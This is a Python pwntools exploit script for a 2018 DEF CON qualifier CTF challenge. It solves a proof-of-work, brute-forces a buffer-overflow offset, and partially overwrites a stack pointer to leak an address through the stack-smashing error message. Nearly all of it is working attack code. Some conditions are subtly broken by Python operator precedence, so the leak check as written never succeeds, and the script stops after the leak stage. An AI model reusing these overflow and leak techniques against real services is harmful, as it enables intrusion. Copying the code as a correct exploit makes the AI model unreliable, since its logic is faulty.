#!/usr/bin/env python
from pwn import *
import sys
import struct
import hashlib
import random


def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


host , port = 'e4771e24.quals2018.oooverflow.io' , 31337

y = remote( host , port )

y.recvuntil( ': ' )
challenge = y.recvline().strip()
y.recvuntil( ': ' )
n = int( y.recvline() )

y.sendlineafter( ':' , str( solve_pow(challenge, n) ) )

l = 0

info( 'find stable offset' )

for i in xrange( 0x10000 ):

    y.recvuntil( 'Go' )
    y.send( p64( 0 ) )
    y.send( p64( 0 ) )
    y.send( '\x00' * 0x50 + p64( 0 ) * i + '\x00'  )
    y.recvline()
    o = y.recvline()
    if 'baby' not in o:
        l = i * 8 + 0x50
        break

success( 'offset -> %s' % hex( l ) )

base = 0

info( 'Leak stack' )

for i in xrange( 0x10000 ):

    y.recvuntil( 'Go' )
    y.send( p64( 0 ) )
    y.send( p64( 0 ) )
    r = random.randint( 0 , 0xffff ) & 0xfff0
    y.send( '\x00' * l + p16( r ) )
    y.recvline()
    o = y.recvline()
    try:
        leak = u64( o[o.find('***: ') + 5 : o.find(' ter') ].ljust( 8 , '\x00' ) )
    except:
        pass
    success( '%s -> %s' % ( hex( r ) , hex( leak ) ) )
    if leak & 0xff0000000000 == 0x55:
        base = leak & 0xffffffffff00
        break


    y.recvuntil( 'Go' )
    y.send( p64( 0 ) )
    y.send( p64( 0 ) )
    r = random.randint( 0 , 0xffff ) & 0xfff0 + 8
    y.send( '\x00' * l + p16( r )  )
    y.recvline()
    o = y.recvline()
    try:
        leak = u64( o[o.find('***: ') + 5 : o.find(' ter') ].ljust( 8 , '\x00' ) )
    except:
        pass
    success( '%s -> %s' % ( hex( r ) , hex( leak ) ) )
    if leak & 0xff0000000000 == 0x55:
        base = leak & 0xffffffffff00
        break




y.interactive()
